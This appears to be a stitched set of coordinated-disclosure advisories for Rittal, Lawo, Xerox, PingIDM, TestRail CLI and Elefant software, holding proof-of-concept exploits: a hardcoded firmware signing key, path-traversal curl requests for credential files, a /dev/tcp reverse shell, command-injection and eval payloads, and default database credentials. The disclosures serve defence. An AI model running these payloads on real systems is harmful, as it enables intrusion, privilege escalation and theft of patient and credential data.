In 1969, the company was renamed\nRittal, in honour of its roots in Rittershausen in Dietzhölztal. Within\njust a few years, Rittal enclosures had become established as a global\nstandard, and have remained so to this day.\"\n\nSource: https://www.rittal.com/com-en/Company\n\n\nBusiness recommendation:\n------------------------\nThe vendor provides a patch which should be installed immediately on the affected\ndevices.\n\nSEC Consult highly recommends to perform a thorough security review of the product\nconducted by security professionals to identify and resolve potential further\nsecurity issues.\n\n\nVulnerability overview/description:\n-----------------------------------\n1) Improper signature verification of firmware upgrade files (CVE-2024-47943)\nThe firmware upgrade function in the admin web interface checks if the\npatch files are signed before executing the containing run.sh script.\nThe signing process is kind of an HMAC with a long string as key\nwhich is hard-coded in the firmware and is freely available for download.\nThis allows crafting malicious \"signed\" .patch files in order to compromise\nthe device and execute arbitrary code.\n\n\n2) Missing Protection Mechanism for Alternate Hardware Interface (CVE-2024-47944)\nThe device directly executes .patch files on a USB stick without any authentication.\nThis leads to an unauthenticated code execution in combination with 1).\n\n\n3) Predictable Session ID (CVE-2024-47945)\nThe device is vulnerable to session hijacking due to insufficient entropy\nin its session ID generation algorithm. The session IDs are predictable,\nwith only 32,768 possible values per user, which allows attackers to pre-generate\nvalid session IDs, leading to unauthorized access to user sessions. This is not\nonly due to the use of an (insecure) rand() function call but also because of\nmissing initialization via srand(). As a result only the PIDs are effectively\nused as seed.\n\n\nProof of concept:\n-----------------\n1) Improper signature verification of firmware upgrade files (CVE-2024-47943)\nTo create a firmware or patch file passing the signature verification\nthe following steps are necessary:\n\n- Store SHA512sum of all files of the fake firmware (needs run.sh) in file \"rittal\"\n- Append hardcoded key \"8ab4ce0f72bce9b3837281b7928732c5abfc43103a681214942dec2cc\n  91f236ce8e9263f5778cc6db253ade368b0db4a9ff2adb9cc9f76c5114fe3ffcaf38bba\" to the file\n- Store SHA512sum of the file \"rittal\" in rittal.sig (delete \"rittal\" file if in directory)\n- Create .tar of fake firmware files (e.g. run.sh & rittal.sig)\n- Rename to <name>.patch\n- Apply firmware upgrade (needs admin session in web interface)\n- Profit\n\nThe attached PoC code creates a new valid .patch file which will be executed with\nroot privileges when the firmware upgrade will be applied.\n\n\n2) Missing Protection Mechanism for Alternate Hardware Interface (CVE-2024-47944)\nThis PoC describes the exploit from 1) without authentication but physical access.\nFor exploitation a signed (see 1)) firmware or .patch file is needed.\nA script checks for new content of plugged-in USB sticks or SD cards.\nIf there is a .patch file available, the signature verification process\nwill be triggered.\n\nThe attached PoC code can also be used to generate signed firmware files.\n\n\n3) Predictable Session ID (CVE-2024-47945)\nThe following function generates the sessionID for the web interface.\nThe code is part of the json.cgi script, which is invoked by the\nLighttpd web server:\n\n  generate_sessionID(int a1, int UserID)\n  {\n    int pid; // r5\n    int seed; // r0\n\n    pid = getpid();\n    seed = rand();\n    srand(pid + seed);\n    return ((rand() + 123) & 0xFFFFF00F) + 16 * UserID;\n  }\n\nIt has been identified that the rand() function used in the sessionID generation\nhas a complexity of 2^31, which is inherently weak. However, the practical\nimplications for online brute-force attacks are limited due to additional factors.\n\nThe Process ID (PID) can range between 0 and 32768, and the UserID can vary from\n0 to 256, which slightly increases the complexity. The primary issue lies\nin the initial call to rand(), which always returns 1804289383 because it is not\ninitialized with srand(). Since json.cgi is invoked for every request, the\nsubsequent initialization does not take effect. This results in the seed being\nessentially ineffective, leaving only the PID to function as the seed.\n\nThe UserID value is dependent on the user, with \"admin\" having a UserID of 0 and\n\"user\" having a UserID of 1.\n\nConsequently, the sessionID has an entropy of only 32768, making it highly\nsusceptible to exploitation within a few minutes.\n\nThe attached PoC code takes a list of sessionIDs and performs an online\nbrute-force attack. A valid session needs to be active.\n\n\nVulnerable / tested versions:\n-----------------------------\nThe following versions have been tested which were the latest version available\nat the time of the test:\n* 6.17.00\n* 6.19.00.1\n\nIt is assumed that all previous versions <V6.21.00.2 are affected.\n\nThe vendor confirmed that the products 3124.300 IoT Interface and 7030.000 CMC\nIII Processing Unit are affected.\n\n\nVendor contact timeline:\n------------------------\n2024-06-21: Contacting vendor through info () rittal de; no response.\n2024-07-01: Contacting vendor through LinkedIn.\n2024-07-02: Received contact for embedded devices.\n2024-07-03: Sent advisory to Rittal contact.\n2024-07-12: Response from vendor that V6.21.00.2 with fixed vulnerabilities will\n            be released on 2024-09-30.\n2024-10-07: Reserving CVE numbers.\n2024-10-08: Informing Rittal about upcoming security conference talk having Rittal\n            as an example regarding SessionID entropy, sending CVE numbers to vendor,\n            asking again about affected products.\n2024-10-11: Vendor confirms affected products, security fixes have already been\n            published.\n2024-10-15: Coordinated release of security advisory.\n\n\nSolution:\n---------\nThe vendor provides a patched version V6.21.00.2 which can be downloaded from\nthe following URL:\nhttps://www.rittal.com/de-de/products/deep/3124300\n\n\nWorkaround:\n-----------\nNone\n\n\nAdvisory URL:\n-------------\nhttps://sec-consult.com/vulnerability-lab/\n\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSEC Consult Vulnerability Lab\nAn integrated part of SEC Consult, an Eviden business\nEurope | Asia\n\nAbout SEC Consult Vulnerability Lab\nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an\nEviden business.

By sending a specially crafted HTTP request, an\nunauthenticated remote attacker can download arbitrary files from the vulnerable\nsystem. As a limitation, the exploitation is only possible if the requested file\nhas a file extension, e.g. .exe or .txt.\n\nThe web server is running with highest SYSTEM privileges per default, which\nenables an attacker to gain access to privileged files.\n\n\nProof of concept:\n-----------------\n1) Unauthenticated Path Traversal Vulnerability (CVE-2024-6049)\nTo exploit the vulnerability it is sufficient to use the following curl-command\nto send a request to the vulnerable web server:\n\ncurl http://$host:8033/.../.../.../.../.../.../.../.../.../<Path to file>\n\nFor example, the following command can be used to request the default file\nwin.ini:\n\ncurl http://$host:8033/.../.../.../.../.../.../.../.../.../Windows/win.ini\n\nIf the application is running with SYSTEM-privileges (default), the following\ncommand can be used to exfiltrate the Powershell history of the Windows\nadministrator, which might leak sensitive information:\n\ncurl \nhttp://$host:8033/.../.../.../.../.../.../.../.../.../Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt\n\n\nVulnerable / tested versions:\n-----------------------------\nThe following version has been tested which was the latest version available\nat the time of the test:\n* 4.4.12.0\n\nAccording to the vendor, versions before 4.5 are affected and v4.5.6.0\nincludes the fixes.\n\n\nVendor contact timeline:\n------------------------\n2024-01-22: Contacting vendor through info () lawo com; no response\n2024-02-14: Contacting vendor again, adding support () lawo com email\n2024-02-15: Vendor response (support), asking for details.\n2024-02-15: Asking where to submit the advisory, whether encryption\n            is supported.\n2024-02-16: Vendor, submit either via email or JIRA; informing us\n            that broadcasting software security levels are not that high\n            as the network is usually not connected to the outside.\n2024-02-16: Submitting security advisory to vendor JIRA; explaining\n            our severity estimation and risks by exposing the affected\n            service.\n2024-02-20: Vendor has taken a look at the advisory, asking whether\n            HTTPS would solve the issue.\n            Telling vendor, that HTTPS won't fix the problem, describing\n            the security issue again, providing link to OWASP path traversal\n            page, etc.\n2024-02-21: Vendor cannot reproduce issue in Chrome browser.\n            Explaining how we exploited the vulnerability.\n2024-03-11: Asking for a status update; no update from R&D yet, vendor will\n            keep us updated.\n2024-04-09: Asking for a status update, whether vendor needs further support.\n2024-04-10: Vendor pinged their PM, will let us know as soon as feedback is\n            available.\n2024-05-15: Vendor recently introduced \"a login\" for vTimeSync which only\n            lets people with a username and a PW access the page.

SEC Consult has re-identified some critical 0-days (unauthenticated RCE,\npartial authentication bypass) that were already patched but not clearly\ncommunicated in the previous security notes.\n\nSEC Consult highly recommends to perform a thorough security review of the product\nconducted by security professionals to identify and resolve potential further\nsecurity issues.\n\n\nVulnerability overview/description:\n-----------------------------------\n1) Authenticated Remote Code Execution (RCE) (CVE-2024-6333)\nAn attacker authenticated as a user with administrative access to the\nweb interface of a range of affected Xerox printers can exploit a remote code\nexecution vulnerability (RCE) as root user. It allows an attacker to execute\ncommands directly on the operating system of the printer with root permissions.\nConsequently, the target Xerox printer can be fully compromised.\n\n\nProof of concept:\n-----------------\n1) Authenticated Remote Code Execution (RCE) (CVE-2024-6333)\nThe \"Network Troubleshooting\" menu enables administrators to configure and run\nnetwork troubleshooting based on the tcpdump tool. The web interface allows to\napply custom filters like an IPv4 address as well as specific network services,\nas seen in the image (figure 1) below.\n\n<img Network_Troubleshooting.png>\n\nDue to insufficient input validation in the IPv4 address value, an attacker\nmay inject further OS commands into the final tcpdump command string. For\nexample, by setting the IPv4 address to the value \"0.0.0.0$(bash $TMP~cmd)\",\ncommands stored under \"/tmp/~cmd\" get executed, when starting a network\ntroubleshooting session.\n\nNote: The payload in the IPv4 address must bypass a character filter,\nand was kept simple for demonstration purposes. Other payloads that directly\nexecute commands without requiring the \"/tmp/~cmd\" file exist and can be\ncrafted.\n\nAn attacker who, for example, has previously exploited the unauthenticated\nRCE vulnerability (fixed with Xerox Security Bulletin XRX23-020) can plant\nthe following commands for a reverse shell in to \"/tmp/~cmd\".\n\n-------------------------------------------------------------------------------\n\nbash -i >/dev/tcp/X.X.X.X/10004 0>&1 2>&1\n\n-------------------------------------------------------------------------------\n\nSince, the network troubleshooting service is running tcpdump with root\npermissions, full access to a range of Xerox printers can be obtained this way.\nSee figure 2 below.\n\n<img reverse_shell.png>\n\n\nVulnerable versions:\n-----------------------------\nThe following products & versions have been tested initially, which were not\npatched to the latest version according to vendor.

As expected the test user 'secUser1'\nwas returned. In addition, observe that the password field is never to be\nreturned in any form (plaintext or encrypted) by the API.\n\nDespite not being available for filtering in either the UI or API documentation,\nthe 'password' field can be used instead of 'userName' in the example above\nto query users based on their password. In case the PingIDM instance has been\nconfigured to store user passwords persistently in plaintext, it can be queried\ndirectly as shown in the request below:\n\nHTTP Request\n```\nGET /openidm/managed/user?_queryFilter=password+sw+\"a\" HTTP/2\nHost: $HOST\nCookie: route=1712737028.694.31674.440043|b75f0b2274c1023ba864392bb04e5ca3; i18next=en-us; session-jwt=[redacted]\nAccept-Api-Version: resource=1.0\nAccept: application/json\nReferer: https://$HOST/api/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nPriority: u=1, i\n```\n\nHTTP Response\n```\nHTTP/2 200 OK\nDate: Wed, 10 Apr 2024 13:07:17 GMT\nContent-Type: application/json;charset=utf-8\nContent-Length: 534\nCache-Control: no-store\nContent-Security-Policy: default-src 'none';frame-ancestors 'none';sandbox\nCross-Origin-Opener-Policy: same-origin\nCross-Origin-Resource-Policy: same-origin\nExpires: 0\nPragma: no-cache\nSet-Cookie: session-jwt=[redacted]\nPath=/; HttpOnly\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nVary: Accept-Encoding, User-Agent\nStrict-Transport-Security: max-age=15724800; includeSubDomains\nX-Forgerock-Transactionid: 4261c9f68aa23e492ad57a19973188a9\n\n{\n    \"result\": [\n        {\n            \"_id\": \"0a0f9700-1f7e-498c-967d-b24a0b3ab301\",\n            \"_rev\": \"0cc5575b-ce37-47c1-9beb-408b477c924e-1665022\",\n            \"userName\": \"secUser1\",\n            \"accountStatus\": \"active\",\n            \"postalCode\": \"8046\",\n            \"stateProvince\": \"ZH\",\n            \"postalAddress\": \"Flurstrasse\",\n            \"description\": \"Pentest User 1\",\n            \"country\": \"CH\",\n            \"city\": \"Zurich\",\n            \"givenName\": \"SEC\",\n            \"sn\": \"Consult\",\n            \"mail\": \"secuser1 () sec-consult com\",\n            \"preferences\": {\n                \"updates\": true,\n                \"marketing\": false\n            }\n        }\n    ],\n    \"resultCount\": 1,\n    \"pagedResultsCookie\": null,\n    \"totalPagedResultsPolicy\": \"NONE\",\n    \"totalPagedResults\": -1,\n    \"remainingPagedResults\": -1\n}\n```\n\nAs it can be noticed in the request above, all users with a password starting\nwith 'a' (case insensitive) were queried and as expected, user 'secUser1' with\npassword 'aAqQ1234!' was returned.

An example\nof an encrypted password JSON object is shown below:\n\n```\n  \"username\" : \"anonymous\",\n  \"password\" : {\n                        \"$crypto\" : {\n                            \"type\" : \"x-simple-encryption\",\n                            \"value\" : {\n                                \"cipher\" : \"AES/CBC/PKCS5Padding\",\n                                \"stableId\" : \"openidm-sym-default\",\n                                \"salt\" : \"9fwdc+Vp1LxDno0YC6bXAA==\",\n                                \"data\" : \"JtFAY+EupwCSLbH06d5OPA==\",\n                                \"keySize\" : 16,\n                                \"purpose\" : \"idm.config.encryption\",\n                                \"iv\" : \"Aaek9zviMgZVz/fvOOobIQ==\",\n                                \"mac\" : \"IhKQTvyjcJqw1aW5BMBZpQ==\"\n                            }\n                       }\n                },\n```\n\nWhile at first glance this object structure seems to break the query filter\ninjection from the previous example, it was found that all encrypted password\nfields can be queried in the exact same way using the '_queryFilter' GET\nparameter, and by fully specifying their path within the JSON object, for\nexample:\n\n```\nGET /openidm/managed/user?_queryFilter=password/$crypto/value/data+sw+\"J\"\n```\n\nThe above request can be modified to include all other fields such as cipher,\nsalt, data, iv, mac, etc. Obtaining a cleartext password in this example,\nwould be clearly more challenging, as it would entirely depend on the security\nof the encryption key utilized. However, under certain circumstances\n(subject to user permissions), users in PingIDM can use the REST API to decrypt\nencrypted objects without the need for the key, as shown in the documentation:\n\n```\ncurl \\\n--header \"X-OpenIDM-Username: openidm-admin\" \\\n--header \"X-OpenIDM-Password: openidm-admin\" \\\n--header \"Content-Type: application/json\" \\\n--cacert ca-cert.pem \\\n--request POST \\\n--data '{\n  \"type\": \"text/javascript\",\n  \"globals\": {\n    \"val\": {\n      \"$crypto\": {\n        \"type\": \"x-simple-encryption\",\n        \"value\": {\n          \"cipher\": \"AES/CBC/PKCS5Padding\",\n          \"stableId\": \"openidm-sym-default\",\n          \"salt\": \"qAS/eG7zdnFyK5H8lXvqTA==\",\n          \"data\": \"zewf6hR1yjp34EFJqUGpdnzzFCPJs2IaX4V97jdQlSI=\",\n          \"keySize\": 16,\n          \"purpose\": \"idm.password.encryption\",\n          \"iv\": \"A4pIiY6kG6t0uLyLmJAoWQ==\",\n          \"mac\": \"sFDJqg0Mmp0Ftl+1q1Bjzw==\"\n        }\n      }\n    }\n  },\n  \"source\":\"openidm.decrypt(val);\"\n}' \\\n\"https://$HOST/openidm/script?_action=eval\";\n{\n  \"myKey\": \"myPassword\"\n}\n```\nsource: https://backstage.forgerock.com/docs/idm/7/security-guide/keystore-encrypt-decrypt.html\n\n\nVulnerable / tested versions:\n-----------------------------\nThe following versions have been tested which were the latest version\navailable at the time of the test:\n* 7.3.0\n* 7.5.0\n\nThe vendor communicated the following affected versions:\n* 7.0.0 - 7.5.0, specifically 7.0.2, 7.1.3, 7.2, 7.3, 7.4, 7.5 (and older unsupported versions)\n\n\nVendor contact timeline:\n------------------------\n2024-04-17: Contacting vendor through https://support.pingidentity.com/s/security-vulnerability\n            No response.\n2024-05-02: Contacting vendor through vulnerability submission form again.\n            No response.\n2024-05-23: Contacting CISO via LinkedIn.

Furthermore, the upcoming release 8.0 includes the fixes as well:\nhttps://backstage.forgerock.com/downloads/browse/idm/all/productId:idm\n\nVendor security advisory with further information:\nhttps://backstage.forgerock.com/knowledge/advisories/article/a95212747\n\n\nWorkaround:\n-----------\nFor custom roles, a granular permission selection can be made on all\nobject's fields allowing 'Read', 'Read/Write', and 'None' access options.\nIn the User object, the 'password' field is configurable to these\npermissions as well, even though this field can never be retrieved\nor read from any API endpoints or UI (rightfully so). If the\npermissions for the 'password' field under the user role are set\nto 'None', this will prevent also queries from being executed on\nthat field. By default, when assigning read permissions to an object,\nall fields are marked as 'Read', as expected, therefore this change\nneeds to be done manually.\n\nUnfortunately, for built-in roles, e.g. 'openidm-admin', these granular\npermissions cannot be set, therefore this workaround won't work.\n\n\nAdvisory URL:\n-------------\nhttps://sec-consult.com/vulnerability-lab/\n\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSEC Consult Vulnerability Lab\nAn integrated part of SEC Consult, an Eviden business\nEurope | Asia\n\nAbout SEC Consult Vulnerability Lab\nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an\nEviden business.

        "date": "Devin Cook (Nov 06)",
        "content": "This is not a very exciting vulnerability, but I had already publicly disclosed\nit on GitHub at the request of the vendor. Since that report has disappeared,\nthe link I had provided to MITRE was invalid, so here it is again.\n\n-Devin\n\n---\n\n# Unsafe `eval()` in TestRail CLI FieldsParser\n\nDate Reported: 2024-10-03\nCVSSv3.1 Score: 7.3\nCVSSv3.1 Vector: AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H\nSeverity: Medium\nVulnerability Class: Eval Injection\n\n## Summary\n\nWhile parsing test result XML files with the TestRail CLI, the presence of\ncertain TestRail-specific fields can cause untrusted data to flow into an\n`eval()` statement, leading to arbitrary code execution. In order to exploit\nthis, an attacker would need to be able to cause the TestRail CLI to parse a\nmalicious XML file. Normally an attacker with this level of control would\nalready have other avenues of gaining code execution.\n\nHowever, there could be cases where an attacker can inject a malicious test\nresult file but is otherwise unable to execute arbitrary code on the system\nrunning the TestRail CLI, resulting in a Local Privilege Escalation or Remote\nCode Execution issue. In the worst case, this could result in compromising a\nbuild system.\n\n## Description\n\nThe vulnerability stems from the `eval()` statement in the\n`FieldsParser.resolve_fields()` method:\n\n```py\ndef resolve_fields(fields: Union[List[str], Dict]) -> (Dict, str):\n    error = None\n    fields_dictionary = {}\n    try:\n        if isinstance(fields, list) or isinstance(fields, tuple):\n            for field in fields:\n                field, value = field.split(\":\", maxsplit=1)\n                if value.startswith(\"[\"):\n                    try:\n                        value = eval(value)\n                    except Exception:\n                        pass\n                fields_dictionary[field] = value\n        elif isinstance(fields, dict):\n            fields_dictionary = fields\n        else:\n            error = f\"Invalid field type ({type(fields)}), supported\ntypes are tuple/list/dictionary\"\n        return fields_dictionary, error\n    except Exception as ex:\n        return fields_dictionary, f\"Error parsing fields: {ex}\"\n```\n\nhttps://github.com/gurock/trcli/blob/066008477bd4b05e46bb723c09373e8111cb2dea/trcli/data_classes/data_parsers.py#L61\n\nThis method is called when parsing result or case fields in JUnit or Robot XML\nfiles if there are any Properties that have names starting\nwith`testrail_result_field` or `testrail_case_field`. In both cases, the value\nor text of that Property is passed more or less directly to `eval()`.\n\nA specially crafted Property value can therefore be used to execute arbitrary\nPython code.\n\n### Examples\n\nThe following XML file will cause the TestRail CLI to spawn a shell and execute\nour echo command:\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<testsuites time=\"15.682687\">\n    <testsuite name=\"Tests.Execution\" time=\"6.666666\">\n        <testcase name=\"testCase0\" classname=\"Tests.Registration\" assertions=\"4\"\n            time=\"1.625275\" file=\"tests/registration.code\" line=\"302\">\n            <properties>\n                <property name=\"testrail_case_field\">\n                    :[] or __import__('os').system('echo THIS IS\nINSIDE THE EVAL STATEMENT')\n                </property>\n            </properties>\n        </testcase>\n    </testsuite>\n</testsuites>\n```\n\n```\n(trcli) devin@devin-laptop:~/code/trcli$ trcli -h http://127.0.0.1 -u\nme -p no --project foo parse_junit -f ./pwn.xml --title bar\nTestRail CLI v1.9.7\nCopyright 2024 Gurock Software GmbH - www.gurock.com\nParser Results Execution Parameters\n",

The software is ideal\nfor individual and group practices, private accountants, medical care centers\nand training institutes in the fields of behavioral therapy, psychoanalysis,\ndepth psychology -based psychotherapy and systemic therapy.\"\n\nSource: https://hasomed.de/produkte/elefant/\n\n\nBusiness recommendation:\n------------------------\nThe vendor provides a patch which should be installed immediately.\n\nSEC Consult highly recommends to perform a thorough security review of the\nproduct conducted by security professionals to identify and resolve potential\nfurther security issues.\n\n\nVulnerability overview/description:\n-----------------------------------\n1) Unprotected Exposed Firebird Database (CVE-2024-50588)\nAn unauthenticated attacker with access to the local network of the medical\noffice can use known default credentials to gain remote DBA access to the\nElefant Firebird database. The data in the database includes patient data and\nlogin credentials among other sensitive data. In addition, this enables\nan attacker to create and overwrite arbitrary files on the server filesystem\nwith the rights of the Firebird database (\"NT AUTHORITY\\SYSTEM\").\n\n2) Unprotected FHIR API (CVE-2024-50589)\nAn unauthenticated attacker with access to the local network of the medical\noffice can query an unprotected Fast Healthcare Interoperability Resources\n(FHIR) API to get access to sensitive electronic health records (EHR).\n\n3) Local Privilege Escalation via Weak Service Binary Permissions (CVE-2024-50590)\nAn attacker with local access the to medical office computer can escalate his\nWindows user privileges to \"NT AUTHORITY\\SYSTEM\" by overwriting one of two\nElefant service binaries with weak permissions.\n\n4) Local Privilege Escalation via Command Injection (CVE-2024-50591)\nAn attacker with local access the to medical office computer can escalate his\nWindows user privileges to \"NT AUTHORITY\\SYSTEM\" by exploiting a command\ninjection vulnerability in the Elefant Update Service. The command injection\ncan be exploited by communicating with the Elefant Update Service which is\nrunning as \"SYSTEM\" via Windows Named Pipes.\n\n5) Local Privilege Escalation via Race Condition (CVE-2024-50592)\nAn attacker with local access the to medical office computer can escalate his\nWindows user privileges to \"NT AUTHORITY\\SYSTEM\" by exploiting a race condition\nin the Elefant Update Service during the repair or update process.\n\n6) Hardcoded Service Password (CVE-2024-50593)\nAn attacker with local access to the medical office computer can access\nrestricted functions of the Elefant Service tool by using a hardcoded\n\"Hotline\" password.\n\n\nProof of concept:\n-----------------\n1) Unprotected Exposed Firebird Database (CVE-2024-50588)\nElefant uses a Firebird DB to store data. The Firebird server listens on all\ninterfaces on port 3050:\n\n<unprotected_db_1.png>\n\nAn attacker can connect directly to the database as DBA if he can reach port\n3050 of the Elefant server using the known Firebird default credentials\n\"SYSDBA:masterkey\" and specifying the Elefant database path\n\"C:\\Elefant1\\ELEFANT.gdb\".\n\n<unprotected_db_2.png>\n\nThe database contains all Elefant data including patient data and the\nobfuscated Elefant login data:\n\n<unprotected_db_3.png>\n\nTo obtain the plain login credentials each byte must be xored with 0x1b.\n\nIn addition an attacker can create and overwrite arbitrary files on the server\nfilesystem with the rights of the database (\"NT AUTHORITY\\SYSTEM\") via Firebird\ndelta files. Depending on other running software (i.e. MS IIS) RCE can be\nachieved this way by uploading a webshell.\n\nThe weak default credentials are hardcoded into Elefant and Elefant Service.\n\n\n2) Unprotected FHIR API (CVE-2024-50589)\nWhile the Elefant client is running it listens on port 9090 on all interfaces.\n\n<unprotected_api_1.png>\n\nAn unauthenticated FHIR API is exposed on this port. An attacker with access to\nport 9090 can query the API for patient and physician data among other data.\nThe API can be queried via plain HTTP.\nAll patient data can for example be queried by visiting the following URL:\nhttp://XXX.XXX.XXX.XXX:9090/Patient\n\nThe API responds with the patient data:\n\n------------------------------------------------------------------------------\n<?xml version=\"1.0\"?>\n<Bundle xmlns=\"http://hl7.org/fhir\";>\n[...]\n  <type value=\"searchset\"/>\n  <timestamp value=\"2024-05-08T20:38:26.859+02:00\"/>\n  <total value=\"4\"/>\n[...]\n     <Patient>\n        <id value=\"patient.3\"/>\n        <meta>\n          <versionId value=\"1\"/>\n          <lastUpdated value=\"2024-05-31T14:42:39.685+02:00\"/>\n          <profile value=\"https://fhir.kbv.de/StructureDefinition/KBV_PR_VoS_Patient|2.1.0\"/>\n        </meta>\n        <identifier>\n          <type>\n            <coding>\n              <system value=\"http://terminology.hl7.org/CodeSystem/v2-0203\"/>\n              <code value=\"MR\"/>\n            </coding>\n          </type>\n          <system value=\"http://hasomed.de/Elefant/Patient\"/>\n          <value value=\"3\"/>\n        </identifier>\n        <identifier>\n          <use value=\"official\"/>\n          <type>\n            <coding>\n              <system value=\"http://fhir.de/CodeSystem/identifier-type-de-basis\"/>\n              <code value=\"PKV\"/>\n            </coding>\n          </type>\n          <system value=\"http://fhir.de/sid/pkv/kvid-10\"/>\n          <value value=\"aaaaa\"/>\n        </identifier>\n        <name>\n          <use value=\"official\"/>\n          <text value=\"Dr. POC Vorname POC Nachname\"/>\n          <family value=\"POC Nachname\">\n            <extension url=\"http://hl7.org/fhir/StructureDefinition/humanname-own-name\";>\n              <valueString value=\"POC Nachname\"/>\n            </extension>\n          </family>\n          <given value=\"POC Vorname\"/>\n          <prefix value=\"Dr.\">\n            <extension url=\"http://hl7.org/fhir/StructureDefinition/iso21090-EN-qualifier\";>\n              <valueCode value=\"AC\"/>\n            </extension>\n          </prefix>\n        </name>\n        <gender value=\"female\"/>\n        <birthDate value=\"2018-11-07\"/>\n        <address>\n          <type value=\"both\"/>\n          <line value=\"Teststr. 1\">\n            <extension url=\"http://hl7.org/fhir/StructureDefinition/iso21090-ADXP-streetName\";>\n              <valueString value=\"Teststr.\"/>\n            </extension>\n            <extension url=\"http://hl7.org/fhir/StructureDefinition/iso21090-ADXP-houseNumber\";>\n              <valueString value=\"1\"/>\n            </extension>\n          </line>\n          <city value=\"Bochum\"/>\n          <postalCode value=\"44801\"/>\n          <country value=\"D\"/>\n        </address>\n      </Patient>\n[...]\n------------------------------------------------------------------------------\n\nSimilarly all practitioner information is available at:\nhttp://XXX.XXX.XXX.XXX:9090/Practitioner/\n\n\n3) Local Privilege Escalation via Weak Service Binary Permissions (CVE-2024-50590)\nThe default installation directory of Elefant is \"C:\\Elefant1\" which is\nwritable for all users. In addition, the Elefant installer registers two\nFirebird database services which are running as \"NT AUTHORITY\\SYSTEM\".\n\n<service_binary_1.png>\n\nBoth service binaries are user writable. This means that a local attacker can\nrename one of the service binaries, replace the service executable with a new\nexecutable, and then restart the system. Once the system has rebooted, the new\nservice binary is executed as \"NT AUTHORITY\\SYSTEM\".\n\n\n4) Local Privilege Escalation via Command Injection (CVE-2024-50591)\nThe Elefant Software Updater (ESU) consists of two components. An ESU service\nwhich runs as \"NT AUTHORITY\\SYSTEM\" and an ESU tray client which communicates\nwith the service to update or repair the installation and is running with user\npermissions. The communication is implemented using named pipes. A crafted\nmessage of type \"MessageType.SupportServiceInfos\" can be sent to the local ESU\nservice to inject commands, which are then executed as \"NT AUTHORITY\\SYSTEM\".\nThe following part of the service is vulnerable against command injection,\nbecause the input is passed on without filtering:\n\n<command_injection_4.png>\n\nThe input is first split at ';', is then used to create a directory, and\nfinally reaches the sink at line 30. Because the input is split at ';' and the\ncreation of the directory must not fail before reaching the sink, only '&' can\nbe used to inject commands here, because Windows does not allow the characters\n'\\/:*?\"<>|' in directory or filenames.  The following payload avoids the\nforbidden characters, ';' and dynamically constructs the path of the target\nscript (C:\\SEC\\exec.ps1).\n\n------------------------------------------------------------------------------\n\"& powershell.exe -NoExit -ep bypass powershell (Join-Path\n    (Join-Path (Get-PSDrive c).root SEC)exec.ps1) #\".\n------------------------------------------------------------------------------\n\nFor this proof of concept, the ESU tray client \"Info\" function was modified to\ninject commands into the ESU service. The payload must be injected into the\nfirst parameter of \"CollectServiceInfos\" to successfully reach the sink in the\nESU service after being sent via a named pipe:\n\n------------------------------------------------------------------------------\nprivate void OnInfo(object sender, EventArgs e)\n{\n        string text = \"C:\\\\SEC\\\\exec.ps1\";\n        TrayUtils.ShowMessageBox(new MessageBoxData\n        {\n                Message = \"MOD: Put PS Script at \" + text,\n                Caption = \"Info\",\n                ButtonType = MessageBoxButtons.OK,\n                IconType = MessageBoxIcon.Asterisk\n        });\n        this.m_TrayManager.CollectServiceInfos(\"& powershell.exe -NoExit -ep bypass powershell (Join-Path\n    (Join-Path (Get-PSDrive c).root SEC)exec.ps1) #\", \"dummy.zip\");\n}\n------------------------------------------------------------------------------\n\nIn this proof of concept the client injects the payload and the ESU service\nexecutes the powershell script at the user writable location C:\\SEC\\exec.ps1.\nThe content of the script is displayed below:\n------------------------------------------------------------------------------\nwhoami > C:\\secwashere\n------------------------------------------------------------------------------\n\n<command_injection_1.png>\n<command_injection_2.png>\n\nAfter the OK button is pressed, the command is injected and executed\nas \"NT AUTHORITY\\SYSTEM\".\n\n<command_injection_3.png>\n\n\n5) Local Privilege Escalation via Race Condition (CVE-2024-50592)\nAnother way to escalate local privileges is to use the Elefant Software Updater\n\"repair\" function. When using the repair function, the service queries the\nserver for a list of files and their hashes. In addition, instructions to\nexecute binaries to finalize the repair process are included:\n\n------------------------------------------------------------------------------\nPOST /eup/release/prod/backend/api/ReadApplicationVersion HTTP/2\nHost: eup.hasomed.de\nAccept: application/json\nApikey: fb[...]\nContent-Type: application/json; charset=utf-8\nContent-Length: 242\n\n{\"programName\":\"elefant\"\n[...]\n------------------------------------------------------------------------------\n\nThe server responds with:\n------------------------------------------------------------------------------\nHTTP/2 200 OK\n[...]\n\"hash\":\"\",\"fileSize\":0,\"type\":\"execute\",\"filePath\":\"PostESUUpdate.exe\",\n\"parameters\":\"\",\"hint\":\"Abschließende Schritte nach der Installation des Elefant-Updates\ndurch den ESU\"},{\"hash\":\"\",\"fileSize\":0,\"type\":\"execute\",\"filePath\":\"Support\\\\Update_OpenJava.exe\"\n,\"parameters\":\"/verysilent\",\"hint\":\"Aktualisierung der OpenJava-Instanz\"}]}\n------------------------------------------------------------------------------\n\nThe executables are executed as \"NT AUTHORITY\\SYSTEM\" after they are copied over to\nthe user writable installation folder (C:\\Elefant1). This means that a user can\noverwrite either \"PostESUUpdate.exe\" or \"Update_OpenJava.exe\" in the time frame\nafter the copy and before the execution of the final repair step. The overwritten\nexecutable is then executed as \"NT AUTHORITY\\SYSTEM\".\n\nThe following steps can be performed to reliably execute the local privilege\nescalation using PostESUUpdate.exe:\n\n1. Delete PostESUUpdate.exe in C:\\Elefant1 before starting the repair function.\n2. Start repair function in ESU\n3. Continuously check if PostESUUpdate.exe has been copied over to C:\\Elefant1\n   yet\n4. Immediately overwrite the executable and wait for the execution as \"NT\n   AUTHORITY\\SYSTEM\"\n\nThe following powershell script can be used to perform steps 3 and 4:\n------------------------------------------------------------------------------\n// delete PostESUUpdate.exe before starting the update/repair\nWhile($true)\n{\nIf(Test-Path -path \"PostESUUpdate.exe\" -PathType Leaf){\nCopy-Item -Force 